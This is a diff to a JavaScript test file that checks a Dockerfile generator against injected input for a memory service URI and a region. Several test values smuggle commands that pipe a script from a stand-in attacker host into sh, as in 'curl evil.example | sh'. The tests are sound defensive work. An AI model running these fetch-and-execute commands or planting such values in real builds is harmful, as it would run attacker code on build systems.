@@ -18,6 +18,7 @@ import {
   isFile,
   isFolderExists,
   loadFileData,
+  saveToFile,
   tryToFindFileRecursively,
 } from '../../src/utils/file_utils.js';
 
@@ -199,6 +200,31 @@ describe('createDockerFileContent', () => {
         region: 'us-central1\nRUN curl https://attacker.example/x.sh | sh\n#',
       }),
     ).toThrow(/Invalid region/);
+  });
+
+  it('should reject a memoryServiceUri containing a newline', () => {
+    expect(() =>
+      createDockerFileContent({
+        ...defaultOptions,
+        memoryServiceUri:
+          'agentengine://x\nRUN sh -c "curl evil.example|sh"\n#',
+      }),
+    ).toThrow(/Invalid memoryServiceUri/);
+  });
+
+  it('should shell-quote memoryServiceUri in the CMD line', () => {
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      memoryServiceUri: 'agentengine://x; curl evil.example | sh #',
+    });
+    expect(content).toContain(
+      "--memory_service_uri='agentengine://x; curl evil.example | sh #'",
+    );
+  });
+
+  it('should omit --memory_service_uri when no memoryServiceUri is given', () => {
+    const content = createDockerFileContent(defaultOptions);
+    expect(content).not.toContain('--memory_service_uri');
   });
 
   it('should still accept appName/project/region containing dots, dashes, and underscores', () => {
@@ -475,6 +501,25 @@ describe('deployToCloudRun', () => {
 
     expect(consoleWarnSpy).toHaveBeenCalledWith(
       expect.stringContaining('WITHOUT authentication'),
+    );
+  });
+
+  it('should forward memoryServiceUri into the generated Dockerfile', async () => {
+    await deployToCloudRun({
+      ...defaultOptions,
+      memoryServiceUri: 'agentengine://1234567890',
+    });
+
+    // createPackageJson writes through the same mock, so the Dockerfile call
+    // is selected by path rather than by index.
+    const call = vi
+      .mocked(saveToFile)
+      .mock.calls.find(([filePath]) => filePath.endsWith('Dockerfile'));
+    if (!call) {
+      expect.fail('no Dockerfile path was passed to saveToFile');
+    }
+    expect(call[1]).toContain(
+      "--memory_service_uri='agentengine://1234567890'",
     );
   });
 
